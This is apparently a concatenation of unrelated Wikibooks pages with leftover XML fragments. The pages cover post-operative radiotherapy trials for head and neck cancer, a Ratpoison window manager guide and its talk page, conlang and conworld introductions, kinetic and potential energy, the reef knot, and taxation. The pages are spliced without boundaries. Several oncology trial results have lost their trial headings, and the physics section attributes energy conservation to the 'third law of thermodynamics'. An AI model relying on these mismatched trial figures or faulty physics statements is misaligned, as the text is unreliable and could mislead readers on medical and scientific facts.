*Please see [[Talk:Radiation_Oncology/Head_%26_Neck/Post-op|discussion tab]] for more trials


*'''RTOG 73-03''' (1973-1979)
**Randomized. 320 patients. Operable stage T2-T4 any N (but not fixed); oral cavity, oropharynx, supraglottic larynx, hypopharynx, or maxillary sinus. Arm 1) Pre-op RT 50 Gy vs. Arm 2) Post-op RT 60 Gy. In addition, OC and OP lesions may be randomized Arm 3) definitive RT 65-70 Gy, with surgery reserved for salvage (n=43).

***Outcome: LRC post-op 65% vs pre-op 48% (SS). Higher rate of persistent disease and recurrence in pre-op. Trend toward improved survival, 38% vs 33% (p=0.1). 
***Toxicity: Complication rate similar. 
***Definitive RT arm: For OC and OP lesions (three-arm randomization), 4-yr OS pre-op 30% vs post-op 36% vs definitive 33% (NS), and LRC 43% vs 52% vs 38% (NS); however total number of patients was small

***Only pre-op vs. post-op subset (n=277). Oral cavity (14%), oropharynx (17%), hypopharynx (43%), supraglottic larynx (26%) 
***Outcome: LRC pre-op 58% vs. post-op 70% (SS), &lt;2 years no difference (failures 59% vs. 58%), but marked &gt;2 years (failures 27% vs 8%); OS no difference due to late (&gt;2 years) deaths from DM and from second primaries
***Supraglottic larynx: LRC pre-op 53% vs. post-op 77% (SS); 78% failures &lt;2 years
***Toxicity: no difference
***Conclusion: Post-op RT better for LRC (especially in SGL), but no impact on OS due to distant failure and second primaries
**Comment: some argument for definitive chemoRT instead of surgery and post-op RT since after 2 yrs, distant mets are primary cause of failure resulting in similar 10 OS in this trial. LRC still better for post-op vs definitive RT alone. Also, different doses used, at the time believed equivalent given the setting

***Outcome: median OS induction chemo 1.5 years vs. control 2.5 years (NS)
***Conclusion: No benefit for induction chemo

==Surgery alone vs Postop RT==
*For patients with locally advanced disease, surgery + postop RT has been widely practiced since Maccomb and Fletcher publication in 1957
*Two small randomized trials suggested improvement in LRC for postop RT over surgery alone. Similarly, several single institution retrospective series showed benefit for improved LRC
*SEER analysis suggests that postop RT in patients with LN+ results in 5-year CSS/OS increase by 10%. Surgery alone cures a third of patients, adjuvant RT adds 10% survival benefit, although this varies dramatically by site and nodal stage
*Current indications include pT3-T4, pN2-N3 disease, nodal disease in Levels IV-V, PNI+, or LVI+

==Post-op Chemotherapy + Radiation==
*Historically, resectable locally advanced HNSCC were treated with surgery + adjuvant RT. Unfortunately, recurrence rates were ~30%, DM rates ~25%, and 5-year OS was ~30%. Majority of recurrences were loco-regional. Patients with SM+ did particularly poorly
*RTOG 85-03 evaluated sequential post-op cisplatin/5-FU followed by RT. There was no benefit in loco-regional control or overall survival
*Meanwhile, early randomized data from Yale (1993) showed an LRC and DFS benefit for concurrent mitomycin C. The LRC and DFS benefit, though without impact on OS, was confirmed in a study from Slovenia evaluating adjuvant mitomycin C and bleomycin
*An early randomized French trial (Bachaud, 1996) demonstrated a survival benefit with concurrent cisplatin
*Concurrent cisplatin with RT was subsequently evaluated in two large randomized trials in US (RTOG 95-01) and Europe (EORTC 22931). The EORTC trial showed significantly better LRC, DFS and OS; the RTOG trial showed significantly better LRC and DFS without impact on OS. Patients had &quot;high-risk&quot; features, which variously included SM+, LN+, ECE, PNI+, LVI+, and T3-4 disease. Joint analysis showed significant benefit for ECE+ or SM+ disease
*Current NCCN recommendations (v2.2008) specify ECE+ or SM+ for concurrent chemo-RT; patients with pT3-T4, pN2-N3, nodal disease in levels IV-V, PNI+ or LVI+ may be treated with RT alone or considered individually for chemo-RT
*However, concurrent cisplatin may be reasonably toxic and a concurrent carboplatin was evaluated. Two trials were closed early due to slow accrual; analysis of the smaller data sets revealed no impact on DFS or OS

===Post-op Sequential Chemo + RT===
*'''RTOG 85-03 / Intergroup 0034''' (1984-1989) -- cisplatin/5-FU
**Randomized. 442 patients. Completely resected tumors of oral cavity, oropharynx, hypopharynx, or larynx. R2 excision not allowed. Arm 1) Post-op RT alone vs Arm 2) Post-op chemotherapy (cisplatin/5-FU x 3 courses q3wk) followed by RT. RT dose 50-54 Gy; boost to 60 Gy for close margins (&lt;5mm) or ECE.

***Outcome: 4-year OS RT 44% vs. chemo-RT 48% (NS); DFS 38% vs. 46% (NS); LRC 70% vs. 74% (NS); reduced first failure in neck 10% vs. 5% (SS), DM 23% vs. 15% (SS)
***Subgroup analysis of high-risk group (margins &lt; 5mm, CIS at margin, ECE) showed a trend to improvement in LC with chemo. So it may be important to select high-risk group to see a benefit from chemo.
***Conclusion: No benefit for adjuvant sequential chemo-RT over RT alone

***Have at least 1 intermediate risk factor: PNI, LVI, &amp;ge;2 positive LNs, single lymph node &gt; 3 cm, close surgical margins (&lt;5 mm), T3 or T4a (microscopic) primary, T2 oral cavity tumor with &gt;5 mm depth of invasion.  Cannot have: positive margins, ECE, or gross residual disease.
***This subgroup of pts with intermediate risk is predicted to have a LRF rate of 15-35% with post-op RT only.
***Phase III. RT (60-66 Gy) +/- cetuximab (concurrent, plus 4 weeks post-RT)


*'''EORTC / RTOG Joint Analysis; 2005''' PMID 16161069 &amp;mdash; &quot;Defining risk levels in locally advanced head and neck cancers: a comparative analysis of concurrent postoperative radiation plus chemotherapy trials of the EORTC (#22931) and RTOG (# 9501).&quot; (Bernier J, Head Neck. 2005 Oct;27(10):843-50.)
**Retrospective subgroup analysis of combined data from postop chemo-RT trials EORTC 229131 and RTOG 9501. Both trials concomitant cisplatin 100 mg/m2 Q3W and RT 60-66 Gy. Difference in &quot;high-risk&quot;: EORTC SM+ , ECE, clinical involvement of Level IV-V from oral cavity/oropharynx primary, perineural disease, or vascular embolism vs. RTOG SM+, ECE, 2+ LN. Difference in endpoints: EORTC PFS vs RTOG LRC. Difference in dose: EORTC 66 Gy in 91% vs RTOG 66 Gy in 13%. 
**Risk factors: ECE or SM+ had negative impact on OS. No other factors (2+ lymph nodes, PNI+, LVI+, Stage III-IV disease) showed difference
***LRC: Pooled risk reduction 42% (SS). If SM+/ECE+, risk reduction 48%. If other factors, reduction not significant (EORTC 58%, p=0.1; RTOG 18%, p=0.5)
***DFS: Pooled risk reduction 23% (SS). If SM+/ECE+, risk reduction 30%. If other factors, reduction not significant (EORTC 25%, p=0.3; RTOG 8%, p=0.7)

**Retrospective. Data collected from RTOG 85-03 (INT 0034) and RTOG 88-24, which were sequential and concurrent chemo-radiotherapy trials for post-op H&amp;N cancers
**New risk factors grouping: Group 1: no risk features; Group 2: 2+ lymph nodes or ECE; Groups 3: SM+
**Outcome: 5-year LRR 17% vs. 27% vs 61%; Median OS 5.6 years vs. 2.6 years vs. 1.5 years
**Conclusion: Suggested benefit for concurrent chemo-radiotherapy with a 50% decrease in local-regional recurrence, but only a small increase in survival (18% reduction in death rate).

===Radiotherapy dose===
*Fletcher: 60 Gy 
*Peters, 1993: 63 Gy for ECE+, otherwise 57.6 Gy
*RTOG 9501: 60 Gy +/- 6 Gy boost (given in 13%)
*EORTC 22931: 66 Gy to high risk region, 54 Gy to large field
*Recommendations (NCCN v2.2008):
**Primary: &gt;= 60 Gy in 2 Gy/fx
**Involved nodal stations: &gt;= 60 Gy in 2 Gy/fx
**Uninvolved nodal stations: &gt;= 50 Gy in 2 Gy/fx


*Fletcher recommended 50 Gy in 25 fractions to control microscopic disease in an ''undissected'' neck. But Fletcher recommended 60 Gy in 30 fractions for a post-operative neck because of hypoxia due to disturbed vascular supply (in the ''Textbook of Radiotherapy, 2nd edition'').
*Peters (M.D. Anderson), 1993 (1983-91) - PMID 8482629 &amp;mdash; &quot;Evaluation of the dose for postoperative radiation therapy of head and neck cancer: first report of a prospective randomized trial.&quot; Peters LJ et al. Int J Radiat Oncol Biol Phys. 1993 Apr 30;26(1):3-11. 
**Purpose: 1) define groups with high and low risk for recurrence, 2) determine the optimal radiotherapy dose, 3) study the dose-response relationship for normal tissue injury
**Randomized. 302 pts. (report based on 240 pts). Eligible pts: oral cavity, oropharynx, hypopharynx, larynx, or unknown primary.  Used a points system to assign pts to low or high risk.  Low-risk pts randomized between 57.6 Gy and 63 Gy. (originally randomized to 52.2-54 Gy as well, but this arm was dropped.) High-risk pts randomized between 63 Gy and 68.4 Gy.  All gross tumor had to be removed but + margins allowed. 54 Gy was given to surgically undisturbed sites with subclinical disease (i.e. contralateral neck) or putative sites of unknown primary. 57.6 Gy to dissected but pathologically negative neck. The randomized dose was given to the pathologically involved neck and primary &amp;mdash; separate randomized doses to neck and primary, but when the primary site was randomized to a higher dose, it took precedence; if neck was to receive higher dose than the primary, then neck boosted with electrons to the higher dose. 
**''Disease control by dose:'' 2-year loco-regional recurrence rate of 26%. Disease-specific survival continued to decline up to about 5 years due to metastatic disease or second primary tumor. Low risk pts receiving &lt;= 54 Gy had a higher primary failure rate than those with &gt;= 57.6 Gy; no increase in control with doses above 57.6 Gy. Also, the point system they used did not accurately predict for recurrence since high and low risk pts receiving the same dose had the same LF rate. 
**''Analysis of prognostic factors:'' analyzed a subset of 199 pts who received at least 57.6 Gy. Only independent risk factor was extracapsular extension; more than 1 positive LN was of borderline significance. Also a cluster of 2 or more risk factors was associated with worse prognosis. Crude recurrence rate was 20-30% if ECE+ but only 5-13% if ECE- and fewer than 4 other risk factors. With 4 or risk factors other than ECE, did just as bad as with ECE. 
**''Dose response for high risk group:'' for pts with ECE, 2-yr control rate was 52% for 57.6 Gy vs 74% for 63 Gy. No added benefit for 68.4 Gy. 
**Conclusions: 57.6 Gy is adequate dose for post-op RT without extracapsular extension; 63 Gy for pts with ECE. 
**See list of risk factors used in this paper (separate section above).

===Alternative Fractionation===
*Evidence for intensifying RT through accelerated fractionation/hyperfractionation after surgery is not strong
*Some benefit might be seen in patients who delay start of RT &gt;7 weeks, but this is on subset analysis
*Balanced against this is the fact that toxicity typically tends to be significantly higher


*'''Sklodowska-Curie Cancer Center, Poland''' (2001-2004) -- conventional RT 5-days/week vs. accelerated RT 7-days/week
**Randomized. 279 patients, high-risk SCC larynx (57%) vs. oral cavity/oropharynx (43%). High risk determined by score using tumor site, SM status, SM width, LVI, grade, number of LN+, ECE, and LN grade. Surgery + lymph node dissection. Arm 1) Conventional RT 63/35 over 7 weeks vs. Arm 2) Accelerated RT 63/35 over 5 weeks
**'''2008''' PMID 18342964 -- &quot;Randomized clinical trial on 7-days-a-week postoperative radiotherapy for high-risk squamous cell head and neck cancer.&quot; (Suwinski R, Radiother Oncol. 2008 May;87(2):155-63. Epub 2008 Mar 14.)
***Outcome: 3-year LRC CF 64% vs. CAIR 70% (NS). Planned subset analysis oropharynx/oral cavity 53% vs. 74% (SS), larynx 72% vs. 67% (NS). LC 73% vs. 81% (NS); neck control 81% vs. 83% (NS). 3-year OS 52% vs. 55% (NS)
***Toxicity: Confluent mucositis CF 33% vs. CAIR 60%, but considered acceptable. Late toxicity Grade 3-4 CF 6% vs. 13%
***Conclusion: Improvement in LRC restricted to patients with oropharynx/oral cavity; no benefit in patients with larynx

*'''Italy Multi-Institutional''' (1994-2001) -- conventional 60/30 vs. accelerated concomitant boost 64/35
**Randomized. 226 patients, locally advanced oral cavity, oropharynx, larynx, or hypopharynx, with high-risk features (pT4, SM+, N2-3, PNI+, LVI+, ECE+, subglottic extension) after surgery. Arm 1) conventional RT 60/30 vs. Arm 2) accelerated RT &quot;biphasic concomitant boost&quot; during first/last week to deliver 64 Gy over 5 weeks. Primary endpoint LRC
**'''2005''' PMID 15708255 -- &quot;Accelerated versus conventional fractionated postoperative radiotherapy for advanced head and neck cancer: results of a multicenter Phase III study.&quot; (Sanguineti G, Int J Radiat Oncol Biol Phys. 2005 Mar 1;61(3):762-71.) Median F/U 2.5 years
***Outcome: 2-year LRC CF 80% vs. AF 78% (NS), trend to benefit for patients with RT delay &gt;7 weeks. 2-year OS 67% vs. 64% (NS)
***Toxicity: Confluent mucositis CF 27% vs. AF 50% (SS), duration same. Late toxicity 18% vs. 27% (NS), though data preliminary
***Conclusion: Accelerated fractionation not beneficial overall, might be option for patients who delay starting RT

*'''MDACC/Mayo/Moffitt''' (1991-1995) -- risk adapted; conventional 63/35 in 7 weeks vs. accelerated 63/35 in 5 weeks
**Risk adapted, part randomized. 213 patients, oral cavity, oropharynx, larynx, hypopharynx. Risk factors ECE, &gt;1 nodal group, &gt;=2 LN+, &gt;3-cm LN, oral cavity, SM+, PNI+ (Peters 1993)
***Low risk (no risk factors): no RT
***Intermediate risk (1 risk factor, excluding ECE): conventional RT 57.6/32
***High risk (ECE or 2+ risk factors): randomized Arm 1) conventional RT 63/35 in 7 weeks vs. accelerated RT 63/35 in 5 weeks concomitant boost. Undissected neck received 54 Gy and dissected but negative neck 57.6 Gy.
**'''2001''' PMID 11597795 &amp;mdash; &quot;Randomized trial addressing risk features and time factors of surgery plus radiotherapy in advanced head-and-neck cancer.&quot; (Ang KK, Int J Radiat Oncol Biol Phys. 2001 Nov 1;51(3):571-8.) Median F/U 4.9 years
***Outcome: 5-year LRC low risk patients 90% vs. intermediate risk patients 94% vs. high risk patients 68% (SS). High risk CF ~60% vs. AF ~75% (NS). 5-year OS low risk 83% vs. intermediate risk 66% vs. high risk 42%, CF ~35% vs. AF ~50% (NS)
***Treatment time: 5-year LRC &lt;11 weeks 76% vs. &gt;11 weeks 62% vs &gt;13 weeks 38% (SS); 5-year OS 48% vs. 27% v. 25% (SS). Surgery-RT interval &gt;6 weeks detrimental
***Conclusion: Risk stratification appropriate. Accelerated fractionation better for patients with delay &gt;6 weeks of starting RT, combined treatment time should be &lt;11 weeks

*'''Cairo, Egypt''' -- conventional RT 60/30 vs. accelerated RT 46.2/33 TID in 2 weeks
**Randomized. 70 patients, T2N1-2 or T3-4 any N, s/p radical surgery. Arm 1) conventional RT 60/30 vs. Arm 2) accelerated RT 46.2/33 TID over 2 weeks
**'''2002''' PMID 11870530 -- &quot;Accelerated hyperfractionation (AHF) compared to conventional fractionation (CF) in the postoperative radiotherapy of locally advanced head and neck cancer: influence of proliferation.&quot; (Awwad HK, Br J Cancer. 2002 Feb 12;86(4):517-23.)
***Outcome: 3-year LRC AHF 88% vs. CF 57% (SS), 3-year OS 60% vs. 46% (NS). No benefit for T(pot) evaluation on multivariate analysis, though rapid tumors higher risk of DM. Surgery-RT gap shouldn't exceed 6 weeks
***Toxicity: acute mucositis more severe in AHF, fibrosis and late edema also worse in AHF
***Conclusion: Accelerated hyperfractionation improved local control, but without survival impact

*'''Cairo, Egypt''' -- conventional RT 50/25 vs. accelerated RT 42/30 TID in 11 days
**Randomized. 56 patients, locally advanced HNSCC, s/p radical surgery. Arm 1) conventional RT 50/25 vs. Arm 2) accelerated RT 42/30 TID over 11 days
**'''1992''' PMID 1480771 -- &quot;Accelerated versus conventional fractionation in the postoperative irradiation of locally advanced head and neck cancer: influence of tumour proliferation.&quot; (Awwad HK, Radiother Oncol. 1992 Dec;25(4):261-6.)
***Outcome: 3-year DFS 46%, no difference between arms. AHF better survival in fast growing tumors (thymidine labeling index &gt;10.4%)
***Toxicity: Acute toxicity higher in AF arm, but 3-year late toxicity CF 87% vs. AF 64% (SS)
***Conclusion: No survival benefit for AF overall, but benefit in faster growing tumors

===Overall treatment time===
*Based, in part, on the fact that overall treatment time for intact head &amp; neck cancers influences outcome and the theory of accelerated repopulation. (Withers' data - Radiobiology). 
*Overall treatment time should be less than 100 days.
*RT should begin within 6 weeks of surgery


*'''University of Pennsylvania; 2002''' (1992-97) - PMID 11891941 &amp;mdash; &quot;Importance of the treatment package time in surgery and postoperative radiation therapy for squamous carcinoma of the head and neck.&quot; Rosenthal DI et al. Head Neck. 2002 Feb;24(2):115-26.
**Retrospective. 208 pts. 
**Overall package time (&gt;= vs &lt; 100 days) was significant on multivariate analysis. 

*'''Rouen, France; 2001'''(1981-92) - PMID 11163507 &amp;mdash; &quot;Influence of the delay of adjuvant postoperative radiation therapy on relapse and survival in oropharyngeal and hypopharyngeal cancers.&quot; Bastit L et al. Int J Radiat Oncol Biol Phys. 2001 Jan 1;49(1):139-46.
**Retospective. 420 pts. 
**Surgery to radiotherapy interval was not a significant predictor for failure.

*'''Florida; 1997''' (1964-94) - PMID 9300748 &amp;mdash; &quot;An analysis of factors influencing the outcome of postoperative irradiation for squamous cell carcinoma of the oral cavity.&quot; Parsons JT et al. Int J Radiat Oncol Biol Phys. 1997 Aug 1;39(1):137-48.
**Oral cavity.
**Improved local control for the unfavorable group if overall &quot;package time&quot; (i.e. from surgery to end of radiotherapy) was within 100 days. For surgery to XRT interval (cutoff: 45-50 days), there was a nonsignificant trend. Also a trend for shorter duration of RT.

*'''Memorial Sloan Kettering; 1990''' (1975-80) - PMID 2325418 &amp;mdash; &quot;Impact of the time interval between surgery and postoperative radiation therapy on locoregional control in advanced head and neck cancer.&quot; Schiff PB et al. J Surg Oncol. 1990 Apr;43(4):203-8.
**Retrospective. 111 pts. Examined time from surgery to start of RT (S-R interval).
**Of 50 pts with S-R interval of 6 weeks or more, 11 (22%) had a local recurrence. 8 of these 11 had RT dose &lt; 56 Gy. Of 17 pts with a delay of 6 weeks who had at least 60 Gy, only 2 (12%) had LR. For those who started RT within 6 weeks and had at least 60 Gy, 3/20 (15%) had a LR. The effect of delay was significant only in those who had &lt; 60 Gy.
**Conclusion: prolonged delay in starting RT does not by itself have a negative impact if doses of 60 Gy or more are given.

      <text xml:space="preserve">==Pros==
#Ratpoison is extremely lightweight and will therefore run on ancient hardware as well as a 32-way SPARC.
#Rodent usage is minimized and the keyboard is promoted, relieving your arms and shoulders and decreasing the risk of injury
#Ratpoison works very well with multiple monitors

==Cons==
#A bit cumbersome to work with
#Not suited for UNIX beginners, this is a window manager written by experts for experts
#Some programs are not written for this kind of window managers and do not work very well.

      <text xml:space="preserve">As stated in the introduction, these instructions assume a working X Windows system.

==Starting ratpoison==
To launch ratpoison as your default window manager you need to edit the file ~/.xinitrc in your homedir; this might already have been done for you by a package manager. The file should just contain the command &quot;ratpoison&quot;, without the quotes. Now start your X server:

 startx

Within a second or two, you'll see a cursor in the middle of the screen superimposed on a dappled grey background, and a small welcome text in the upper right corner that welcomes you to ratpoison- this welcome manager instructs you to type in &quot;C-t ?&quot; if you have any questions. Now is where the fun starts, but first some background on how to interact with and control ratpoison.

==The almighty escape key==
Ratpoison is only controlled by the keyboard; no matter what you click with your mouse on the root window, nothing will happen. Instead, you give it a keyboard command. All ratpoison commands are initiated by typing the escape key sequence. By default, this is Control-t (in Emacs notation, which is preferentially used by ratpoison documentation and users: &quot;C-t&quot;). Try typing C-t, and you'll see that the mouse changes into a white square. This means that ratpoison has taken over the keyboard and is ready to interpret any letter typed as a command (as opposed to normal operation where anything typed is sent to an application to deal with). After typing C-t, try hit the &quot;c&quot; key (note that this is a lowercase key; capital C does not currently do anything). Immediately an X terminal opens up and takes over the screen (assuming xterm is installed as it usually is); in other words, the command c creates a console window. Now you can do anything you could do on the command line, and you can even run your graphical programs like Firefox (the command for starting firefox from a terminal is &quot;mozilla-firefox&quot;)- ratpoison will automatically switch to the newest windows.

Note that if constantly pressing C-t to prefix all commands is uncomfortable (if you, for example are using the Dvorak keyboard layout) you can change it dynamically or in the configuration file. Please see one of the advanced chapters for more information on adjusting key bindings.

==Key strokes==
Try a few different key strokes- you can find the command list in the ratpoison manual or info documentation, or you can type C-t ?, which will give a brief list of sequences. Remember, all key strokes are preceded with C-t.

A useful pair of commands are C-t n (shifts your view to the '''n'''ext window; like conventional alt-tab) and its inverse C-t p (shifts your view to the '''p'''revious window; if you just C-t n'ed, for example, a C-t p will take you back to the original window).

Actually, shouldn't the bookshelf link to Using Ratpoison's cover, and the ToC be the next logical subpage?  If that's the case, then this subpage is a duplicate, and an admin SHOULD delete it.  [[User:Orethrius|Orethrius van Degaurde]] 07:41, 18 Jun 2005 (UTC)

== Organizing the book ==
I noticed your new book [[Using Ratpoison]]. It seems to get very professional. I just want to let you know at an early stage, that a prefered way of creating subpages is &quot;/&quot; or &quot;:&quot; (without spaces before and afterwards), where &quot;/&quot; gives you the additional advantage that you get an automatic link back to your main page. Have a look at the discussion at [[Wikibooks:Hierarchy naming scheme]] or the recent conversion at [[Talk:How To Build A Computer#Organizing the book]]. 
I'd therefore recommend to organize your book like this:
 [[Using Ratpoison]]        &lt;- should be what you currently call Table of Contents
 [[Using Ratpoison/Cover]]  &lt;- Move your cover here (you can link from the bookshelf here)
 [[Using Ratpoison/Introduction]]  &lt;- move &quot;What is Ratpoison&quot; and &quot;Pros and cons&quot; here
 [[Using Ratpoison/Your first steps]]
and so on.
Avoid having too many subpages if you don't have the content yet. For your book, 3 or 4 subpages are enough (more can be easily created later as soon as you have enough content). If there are questions, just ask. --[[User:Andreas Ipp|Andreas]] 10:11, 23 Mar 2005 (UTC)
:Thank you very much for your feedback. This is in fact my first wikibook, so I am glad for any hints that I can get. I will edit the pages subsequently as soon as I can find some spare time. [[User:Etnoy|Etnoy]] 08:16, 26 Mar 2005 (UTC)
I hope you don't mind me taking the liberty here to implement this.  Don't forget that the pipe character '|' can be used to show a link name that differs from the link path, for clarity's sake.  [[User:Orethrius|Orethrius van Degaurde]] 07:04, 18 Jun 2005 (UTC)

== Ratpoison ==

I've been doing a bit of work on the ratpoison book lately- I'm essentially rewriting it and adding in my notes from the past few days (I recently installed a fresh Debian and decided to learn Ratpoison), so my additions reflect my middling knowledge; for example, I'm currently hoping to find out soon how to remap C-t to maybe Win or C-z. Incidentally, what is the copyright on that ratpoison logo? --[[User:Marudubshinki|Maru]]  [[User talk:Marudubshinki|(talk)]] [[Special:Contributions/Marudubshinki|Contribs]] 23:45, 22 January 2006 (UTC)</text>

There are so much implementation defined pragmas that the language defined ones are not easily seen. A possible solution (if this is seen as a problem) is to make two lists: language defined pragmas, and implementation defined pragmas. --[[User:Suruena|suruena]] 10:18, 23 Mar 2005 (UTC)

Conlanging, the art of creating a language, is a very in-depth, but fun, process. It is considered an art form by many. The people who conlang are called conlangers. Conlanging isn't just a hobby, though. You can learn a lot about how real languages work by creating conlangs and improving them.

== Why construct a conlang? ==
* To learn about linguistics.
* To explore how the way we speak affects the way we think.
* To have private conversations with trusted individuals.
* For personal diaries.
* For use as a Lingua Franca.  (Famously, [[w:Esperanto|Esperanto]].)
* For use in a work of fiction.  (Famously, [[w:Klingon language|Klingon]].)
* For the sheer pleasure of artistic creation.  (Famously, Tolkien's [[w:Elvish languages (Middle-earth)|Elvish languages]] &amp;mdash; which inspired him to works of fiction.)

== What are the different types of conlangs? ==
* Engineered Languages (engelangs) &amp;mdash; designed to meet objective criteria.
** Logical Languages (loglangs).
** Philosophical Languages.
* Auxiliary Languages (auxlangs) &amp;mdash; designed as common second languages for people with different native languages.
** International Auxiliary Languages (IALs).
* Artistic Languages (artlangs) &amp;mdash; designed as works of art.

Since each kind of conlang has a different goal, each involves a different process of creation.

The most common conlangs are artlangs.  Many conlangers create a con''world'' to go with their conlang.  They create a conrace, with a conculture.  The process of creating a conworld is outlined in the [[Conworld|Conworld wikibook]].

The different types of conlangs will be discussed, with examples, in [[Conlang/Types|the next section]].

== Where do I start? ==

This wikibook is designed to help you, the conlanger, create a fairly involved conlang.  It will take you step-by-step through the process.

As you work through the steps outlined in this wikibook, you will probably have numerous questions.  A good central place to find resources, including community resources like mailing lists and blogs, is the [https://conlang.org/ Language Creation Society].

      <text xml:space="preserve">We don't know the future, but we can guess what it may be like. It may be our idea of paradise (like the Culture) or our idea of hell (like 1984). A conworld set in the future has much less to go on than one set in the past. That may be one of the main reasons that futuristic conworlds are rarely seen, though there are certainly other factors.

The consociety is where much of the creation occurs. What kind of government the culture has, what kind of economy it has, it all happens here. Most of us are familiar with the various shapes a society can take, from modern American culture to the Middle Ages to ancient Middle-eastern societies and so on.

Some conworlders use this as an opportunity to create their idea of an ideal world while others use it to create a dystopian world. Many opt for a realistic portrayal of society and social evolution, neither utopian nor dystopian.

      <comment>/* Potential Energy */</comment>
      <text xml:space="preserve">== Kinetic Energy ==
Kinetic energy is the energy of a mass in motion. In the non-relativistic approximation, kinetic energy is equal to
:&lt;math&gt;K_E =  \frac{1}{2}mv^2&lt;/math&gt;
:where m is the mass of the object and v is its velocity.

== Potential Energy ==
Potential energy in a constant gravitational field is given by:
:&lt;math&gt;P_E = \ mgh&lt;/math&gt;
:where m is the mass of the object, g is the strength of the gravitational field (&lt;math&gt;9.8 m/s^2&lt;/math&gt; on earth) and h is the height of the object.

Work-Kinetic energy relation
:&lt;math&gt;W = 1/2mV_F^2 - 1/2mV_I^2&lt;/math&gt;

Potential energy, kinetic energy relationship
:&lt;math&gt;K_E = P_E, 1/2mV^2 = mGH &lt;/math&gt;

The law states that P_E (potential energy) is the energy of a given mass and position a certain amount of energy at such a height. When the object is in motion, K_E (kinetic energy), the potential energy is than transfered to kinetic energy. Since due to the third law of thermodynamics which states that energy can not be created nor destroyed, but only tranfered, such transfer of energy can occur

For a given equation, in order to figure out the work of the position, it can be done one of either two ways. The calculus method (which involves integration of the function) and the algebraic way (which involves the work kinetic energy relationship)

Calculus method (ex)-the compression of a spring from 1 m to 4 meters

Since integration basically finds the area of the given function (which can also be shown by the graph if possible). If F = Kx, where F is the force, K is the force constant, and x is the distance it was compressed.  If the original function is F = Kx, since K is a constant, this than becomes K*(integral)X which then becomes K*x^2/2.

In order to figure out the work due to a changing amount of velocity, first determine how much &quot;energy&quot; is in the given system. Your equation from now on will be mgh + 1/2mV^2 = energy at full height.

      <text xml:space="preserve">= Tying a reef knot =

The Boy Scout instructions for this knot are: right-over-left and under; left-over-right and through. 

More formal, tie a left-handed overhand knot and then a right-handed overhand knot or vice versa.

Do not tie two knots of the same handedness. That makes a [[Scouting/Knots/Bends/Granny knot|Granny knot]].

= Description =

[[Image:SquareKnot.png|443x221px]]

'''This knot is the first knot most Boy Scouts learn, and in fact mastery of the knot is listed among the joining requirements in several countries.'''

The Reef knot is only useful in basic applications. It should be used to bind small laces or ropes together, provided not too much force is applied on it, but should not be used as a [[Scouting/Knots/Bends|bend knot]]. It is easily tied and since it won't jam, also easily untied. It is used to tie packages, and as a base for the shoe-bow. Sailors used it for binding rolled sails or better reefed sails.

If you pull on one end, at right-angles to the knot, it will loosen and invert (turning into a lark's head knot), hence its original purpose: it secured the furled-in sails, and is easily undone one-handedly by a sailor who is holding on with the other hand. The weight of the sail would drag the lark's head undone.

== Critics ==

A number of knotting guides have voted this knot &quot;the worst knot&quot;, and noted that more deaths and injuries have been caused by its misuse than all other knots combined. Its symmetry and initial feel of security have led to it having a wide and undeserved reputation as a secure knot, which it certainly is not, especially if the ropes are of differing sizes or materials, or if the rope is likely to be bumped.

The International Guild of Knot Tyers (IGKT) warns that this knot should never be used to bend two ropes together even though many scout troops, and other organisations around the world, insist on teaching it for this very purpose. It is likely that this is the cause of most of the deaths referred to above.

      <text xml:space="preserve">Taxation is the method by which a government gains revenue to spend on things like [[w:public services|public services]] and [[w:welfare|welfare]] benefits. There are many methods by which &lt;b&gt;tax revenue&lt;/b&gt; can be gained, and different definitions and structures to taxation which are outlined below. Also, conflicts in choosing methods and forms of taxation occur, pitting priorities such as reducing iniquity of income against maximising incentive for economic growth.

==Principles of a Good Tax System==
The following were first proposed by the great economist [[w:Adam Smith|Adam Smith]], and are still applicable today:
# &lt;b&gt;Efficient&lt;/b&gt; - A tax system should raise enough revenue such that government projects can be adequately sponsored, without burdening the tax payer too much, or disincentivising investment or work
# &lt;b&gt;Understandable&lt;/b&gt; - The system should not be incomprehensible to the layperson, nor should it appear unjust or unneedfully complex. This is to minimise discontent, and costs.
# &lt;b&gt;Equitable&lt;/b&gt; - Taxation should be governed by people's &lt;i&gt;ability to pay&lt;/i&gt;, that is, wealthier individuals or firms with greater incomes should pay more in tax while those with lower incomes should pay comparatively less.
# &lt;b&gt;Benefit Principle&lt;/b&gt; - Those that use a publicly provided service (which is funding primarily through taxation) should pay for it! However, conflicts in principle may and often do arise between this and principle 3.

==Direct and Indirect Taxation==
*&lt;b&gt;Direct taxes&lt;/b&gt; are paid by taxation on the income of the wage earner. This form of taxation is unavoidable, and for simplicity usually collected before the worker collect his/her wages.
*&lt;b&gt;Indirect taxation&lt;/b&gt; is often avoidable and is not taken from wages. An example of indirect taxation is VAT (Value Added Tax) or sales tax placed on goods and services. This is tax, but not all people &lt;i&gt;have to&lt;/i&gt; pay it, and can choose not to.

The benefits and costs of both forms of taxation are many. Direct taxation reduces the incentive to work, as 'take home' pay is reduced as a result of an increase in income tax compared to unemployment benefits. On the other hand, indirect taxation may result in people with similar incomes and wealth paying different amounts, simply as a result of slightly different circumstance. For example, someone who has to travel 50km to work every day will pay more tax over the year than another who can walk, even though they may earn the same amount and use the same public services etc. Why? The high tax on petrol will add up considerably.

==Taxation Structure==
It is worth knowing some termnology to make understanding easier. The marginal rate of tax (&lt;b&gt;MRT&lt;/b&gt;) is the percentage taken in tax of the &lt;i&gt;next (insert currency unit here) earned&lt;/i&gt;. So, if your MRT is 10%, every next part of your income you earn will be taxed at 10%. However, this doesn't make your average rate of tax (&lt;b&gt;ART&lt;/b&gt;) 10%. Consider the following:
* Say your income is &amp;sect;10,000. If the first half of your income is taxed at 5%, and the second half at 15%, your MRT is 15%. However, your ART is 

&lt;center&gt;&lt;b&gt;[(0.05 x 5000) + (0.15 x 5000)]/10000 = 10%&lt;/b&gt;&lt;/center&gt;
===Proportional Taxation===
Proportional taxation means that &lt;b&gt;MRT = ART&lt;/b&gt;, so if a low income earner is taxed at 20%, so is a higher income earner. The &lt;i&gt;proportion&lt;/i&gt; of tax paid is always the same, though in absolute terms it goes up the higher your income.
===Progressive Taxation===
Progressive taxation means that &lt;b&gt;MRT &gt; ART&lt;/b&gt; (if you are pedantic, if MRT and ART do not equal zero!). For example, in the UK there are three rates of income tax - 10% 'starting tax', 22% 'standard tax', and 40% high rate of tax. For a low income earner, ART will be around 10-22%, whereas a very high income earner will pay more like 30-40% ART. Thus, higher income earners pay a greater proportion of their income in tax than low earners.
===Regressive Taxation===
